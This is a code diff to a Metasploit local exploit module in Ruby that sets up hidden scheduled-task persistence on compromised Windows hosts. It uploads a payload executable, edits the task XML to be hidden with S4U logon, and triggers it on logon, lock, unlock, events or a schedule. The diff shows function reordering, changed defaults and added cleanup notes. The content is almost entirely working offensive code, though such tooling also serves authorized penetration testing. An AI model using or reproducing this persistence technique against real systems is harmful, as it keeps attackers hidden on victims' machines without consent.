@@ -13,6 +13,7 @@ require 'msf/core/post/windows/priv'
 require 'msf/core/exploit/exe'
 
 class Metasploit3 < Msf::Exploit::Local
+	Rank = ExcellentRanking
 
 	include Msf::Post::Common
 	include Msf::Post::File
@@ -32,8 +33,8 @@ class Metasploit3 < Msf::Exploit::Local
 			'License'       => MSF_LICENSE,
 			'Author'        =>
 				[
-					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
 					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
+					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ],
@@ -47,41 +48,25 @@ class Metasploit3 < Msf::Exploit::Local
 		register_options(
 			[
 				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute', '']),
-				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until task expires', '']),
-				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'logon',['logon', 'lock', 'unlock','schedule', 'event', 'version']]),
+				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until scheduled task expires', '1440']),
+				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'schedule',['logon', 'lock', 'unlock','schedule', 'event']]),
 				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
 				OptString.new('PATH',[false, 'PATH to write payload', '']),
-				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event','']),
-				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.','']),
 			], self.class)
 
 		register_advanced_options(
 			[
-
+				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event','']),
+				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.','']),
 				OptString.new('XPATH', [false, 'XPath query','']),
 			], self.class)
 	end
 
 	def exploit
-		# if running and SYSTEM, error and exit!
-		if is_system?
-			print_error("Running as SYSTEM, this module must run as a USER")
+		# If Vista/2008 or later add /R
+		if not (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
+			print_error("This module only works on Vista/2008 and above")
 			return
-		else
-			# If Vista/2008 or later add /R
-			if (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
-
-				######### FIX THIS SHIT ###########
-				res = cmd_exec("cmd.exe","/c gpresult /SCOPE COMPUTER /V")
-				if res =~ /DenyBatchLogonRight\s+Computer Setting:\s+Enabled/m
-					print_error("Logon as batch restricted, cannot run")
-					return
-				end
-				######### FIX THIS SHIT ###########
-			else
-				print_error("This module only works on Vista/2008 and above")
-				return
-			end
 		end
 
 		if datastore['TRIGGER'] == "event"
@@ -101,6 +86,7 @@ class Metasploit3 < Msf::Exploit::Local
 		rexename = generate_rexename
 		return if rexename.nil?
 
+		# Generate path names
 		xml_path,rexe_path = generate_path(rexename)
 		return if not xml_path or not rexe_path
 
@@ -110,9 +96,12 @@ class Metasploit3 < Msf::Exploit::Local
 
 		# create initial task for XML
 		xml = create_xml(rexe_path, schname)
-		return if not xml
+		if not xml
+			delete_file(rexe_path)
+			return
+		end
 
-		# fix XML to add S4U value
+		# fix XML to add S4U value and trigger
 		xml = fix_xml(xml)
 
 		# write XML to victim fs
@@ -126,6 +115,58 @@ class Metasploit3 < Msf::Exploit::Local
 	end
 
 	##############################################################
+	# Generate name for payload
+	# Returns name
+
+	def generate_rexename
+		# Check for valid rexename
+		if datastore['REXENAME'].empty?
+			rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+			return rexename
+		elsif datastore['REXENAME'] =~ /\.exe$/
+			rexename = datastore['REXENAME']
+			return rexename
+		else
+			print_warning("#{datastore['REXENAME']} isn't an exe")
+			return rexename
+		end
+	end
+
+	##############################################################
+	# Generate Path for payload upload
+	# Returns path for xml and payload
+
+	def generate_path(rexename)
+		# generate a path to write payload and xml
+		if not datastore['PATH'].empty?
+			path = datastore['PATH']
+		else
+			path = session.fs.file.expand_path("%TEMP%")
+		end
+		xml_path = "#{path}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.xml"
+		rexe_path = "#{path}\\#{rexename}"
+		return xml_path,rexe_path			
+	end
+
+	##############################################################
+	# Upload the executable payload
+	# Returns boolean for success
+
+	def upload_rexe(path, payload)
+		begin
+			vprint_status("Uploading #{path}")
+			fd = client.fs.file.new(path, "wb")
+			fd.write(payload)
+			fd.close
+		rescue
+			print_error("Could not upload to #{path}")
+			return false
+		end
+		print_status("Successfully uploaded remote executable to #{path}")
+		return true
+	end
+
+	##############################################################
 	# Creates a scheduled task, exports as XML, deletes task
 	# Returns normal XML for generic task
 
@@ -133,6 +174,9 @@ class Metasploit3 < Msf::Exploit::Local
 		if datastore['FREQUENCY'] != 0
 			minutes = datastore['FREQUENCY']
 		else
+			if datastore['TRIGGER'] == 'schedule'
+				print_status("Defaulting frequency to every hour")
+			end
 			minutes = 60
 		end
 
@@ -149,12 +193,60 @@ class Metasploit3 < Msf::Exploit::Local
 		# delete original task
 		delete_response = cmd_exec("cmd.exe","/c schtasks /delete /tn #{schname} /f")
 		if not delete_response =~ /was successfully deleted/
-			print_error("Issues deleting task using schtasks")
-			#return nil
+			print_warning("Issues deleting the temp task using schtasks")
+			print_warning("\tTo delete temp task: schtasks /delete /tn #{schname} /f")
 		end
 		print_status("XML export generated at #{path}")
 		return xml
 	end
+
+	##############################################################
+	# Takes the XML, alters it based on trigger specified. Will also
+	# add in expiration tag if used. 
+	# Returns the modified XML
+
+	def fix_xml(xml)
+		# Insert trigger 
+		case datastore['TRIGGER']
+			when 'logon'
+				# Trigger based on winlogon event, checks windows license key after logon
+				print_status("This trigger triggers on event 4101 which validates the Windows license")
+				line = "(EventID=4101) and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]"
+				xml = create_trigger_event_tags("Application", line, xml)
+
+			when 'lock'
+				xml = create_trigger_tags("SessionLock", xml)
+
+			when 'unlock'
+				xml = create_trigger_tags("SessionUnlock", xml)
+
+			when 'event'
+				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
+				if not datastore['XPATH'].empty?
+					line << " and #{datastore['XPATH']}"
+				end
+				vprint_status("\tPayload will trigger on #{line}")
+
+				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
+
+			when 'schedule'
+				# Generate expire tag, insert into XML
+				end_boundary = create_expire_tag
+				insert = xml.index("</StartBoundary>")
+				xml.insert(insert + 16, "\n      #{end_boundary}")
+		end
+
+		# Change default values
+		xml = xml.sub(/<Hidden>.*?</, '<Hidden>true<')
+
+		# S4U allows for access when the user is not logged on
+		xml = xml.sub(/<LogonType>.*?</, '<LogonType>S4U<')
+
+		# Parallel allows the payload to contine to be triggered if one failed
+		xml = xml.sub(/<MultipleInstancesPolicy>.*?</, '<MultipleInstancesPolicy>Parallel<')
+		return xml
+	end
+
 
 	##############################################################
 	# Creates end boundary tag which expires the trigger
@@ -224,57 +316,6 @@ class Metasploit3 < Msf::Exploit::Local
 	end
 
 	##############################################################
-	# Takes the XML, alters it based on trigger specified. Will also
-	# add in expiration tag if used. 
-	# Returns the modified XML
-
-	def fix_xml(xml)
-		# Insert trigger 
-		case datastore['TRIGGER']
-			when 'logon'
-				# Trigger based on winlogon event, checks windows license key after logon
-				print_status("This trigger triggers on event 4101 which validates the Windows license")
-				line = "(EventID=4101) and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]"
-				xml = create_trigger_event_tags("Application", line, xml)
-
-			when 'lock'
-				xml = create_trigger_tags("SessionLock", xml)
-
-			when 'unlock'
-				xml = create_trigger_tags("SessionUnlock", xml)
-
-			when 'event'
-				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
-				if not datastore['XPATH'].empty?
-					line << " and #{datastore['XPATH']}"
-				end
-				vprint_status("\tPayload will trigger on #{line}")
-
-				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
-	
-			when 'version'
-				line = "*[EventData[Data[@Name='TargetUserName']='Guest']]"
-				xml = create_trigger_event_tags("Security", line, xml)
-
-			when 'schedule'
-				# Generate expire tag, insert into XML
-				end_boundary = create_expire_tag
-				insert = xml.index("</StartBoundary>")
-				xml.insert(insert + 16, "\n      #{end_boundary}")
-		end
-
-		# Change default values
-		xml = xml.sub(/<Hidden>.*?</, '<Hidden>true<')
-
-		# S4U allows for access when the user is not logged on
-		xml = xml.sub(/<LogonType>.*?</, '<LogonType>S4U<')
-
-		# Parallel allows the payload to contine to be triggered if one failed
-		xml = xml.sub(/<MultipleInstancesPolicy>.*?</, '<MultipleInstancesPolicy>Parallel<')
-		return xml
-	end
-
-	##############################################################
 	# Takes the XML and a path and writes file to filesystem
 	# Returns the path of XML
 
@@ -315,70 +356,34 @@ class Metasploit3 < Msf::Exploit::Local
 		create_task_response = cmd_exec("cmd.exe", "/c schtasks /create /xml #{path} /tn #{schname}")
 		if create_task_response =~ /has successfully been created/
 			print_good("Persistence created successfully")
-			print_status("\t To delete task: schtasks.exe /delete /tn #{schname} /f")
+			del_task = "schtasks.exe /delete /tn #{schname} /f"
+			print_status("\t To delete task: #{del_task}")
 			print_status("\t To delete payload: del #{rexe_path}")
+			del_task << "\ndel #{rexe_path}"
 			delete_file(path)
+
+			report_note(:host => session.session_host,
+			:type => "host.s4u_persistance.cleanup",
+			:data => {
+				:session_num => session.sid,
+				:stype => session.type,
+				:desc => session.info,
+				:platform => session.platform,
+				:via_payload => session.via_payload,
+				:via_exploit => session.via_exploit,
+				:created_at => Time.now.utc,
+				:delete_commands =>  del_task
+				}
+			)
 			return true
 		else
 			print_error("Issues creating task using XML file schtasks")
-			if datastore['EVENT_LOG'] == 'Security'
+			if datastore['EVENT_LOG'] == 'Security' and datastore['TRIGGER'] == "Event"
 				print_warning("Security log can restricted by UAC, try a different trigger")
 			end
 			delete_file(rexe_path)
 			delete_file(path)
 			return false
 		end
-	end
-
-	##############################################################
-	# Upload the executable payload
-	# Returns boolean for success
-
-	def upload_rexe(path, payload)
-		begin
-			vprint_status("Uploading #{path}")
-			fd = client.fs.file.new(path, "wb")
-			fd.write(payload)
-			fd.close
-		rescue
-			print_error("Could not upload to #{path}")
-			return false
-		end
-		print_status("Successfully uploaded remote executable to #{path}")
-		return true
-	end
-
-	##############################################################
-	# Generate name for payload
-	# Returns name
-
-	def generate_rexename
-		# Check for valid rexename
-		if datastore['REXENAME'].empty?
-			rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
-			return rexename
-		elsif datastore['REXENAME'] =~ /\.exe$/
-			rexename = datastore['REXENAME']
-			return rexename
-		else
-			print_error("#{datastore['REXENAME']} needs to be an exe")
-			return nil
-		end
-	end
-
-	##############################################################
-	# Generate Path for payload upload
-	# Returns path for xml and payload
-
-	def generate_path(rexename)
-		# generate a path to write payload and xml
-		if not datastore['PATH'].empty?
-			path = datastore['PATH']
-		else
-			path = session.fs.file.expand_path("%TEMP%")
-		end
-		xml_path = "#{path}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.xml"
-		rexe_path = "#{path}\\#{rexename}"
-		return xml_path,rexe_path			
 	end
 end
